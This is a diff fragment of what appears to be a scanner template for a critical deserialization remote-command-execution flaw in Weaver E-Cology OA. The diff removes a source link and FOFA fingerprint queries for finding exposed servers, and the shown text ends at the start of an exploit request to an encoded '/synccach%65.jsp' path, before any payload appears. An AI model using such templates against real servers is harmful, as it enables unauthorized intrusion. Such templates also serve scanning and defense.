@@ -3,12 +3,8 @@ info:
   name: 泛微OA E-Cology sync接口反序列化命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zrqcxgnf539920ak'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zrqcxgnf539920ak
-    fofa: body = "/wui/common/css/w7OVFont_wev8.css" || header="testBanCookie" || body="/wui/common/css/w7OVFont.css" || body="/js/ecology8" || body="alert('高效源于协同')" || body="wui/common/css/w7OVFont_wev8.css"|
 http:
 - raw:
   - 'POST /synccach%65.jsp HTTP/1.1
